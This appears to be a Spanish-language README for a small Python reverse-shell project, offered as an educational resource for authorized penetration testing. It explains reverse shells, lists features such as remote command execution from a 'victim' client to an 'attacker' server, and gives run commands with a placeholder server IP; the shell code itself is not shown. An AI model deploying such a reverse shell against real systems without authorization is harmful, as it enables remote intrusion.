# reverseShellPython

**reverseShellPython** es una implementación básica de una shell inversa escrita en Python. Este proyecto tiene como finalidad servir como recurso educativo para entender cómo funciona una conexión de shell remota en auditorías de seguridad informática.

> ⚠️ **Advertencia**: Este código es solo para fines educativos o pruebas de penetración autorizadas. El uso no autorizado de este software contra sistemas ajenos puede ser ilegal y es responsabilidad exclusiva del usuario.

## ¿Qué es una shell inversa?

Una **shell inversa** es una técnica común en pruebas de penetración en la que una máquina víctima establece una conexión saliente hacia el atacante, dándole control remoto limitado a través de una terminal.

## Características

- Comunicación TCP entre el "cliente víctima" y el "servidor atacante".
- Ejecuta comandos en el sistema remoto y devuelve la salida.
- Código simple y fácil de entender para propósitos educativos.

## Requisitos

- Python 3.x
- Acceso a red entre el cliente y el servidor

## Uso

### 1. Servidor (escucha y controla)

```bash
python3 server.py

python3 client.py <IP_del_servidor> <puerto>
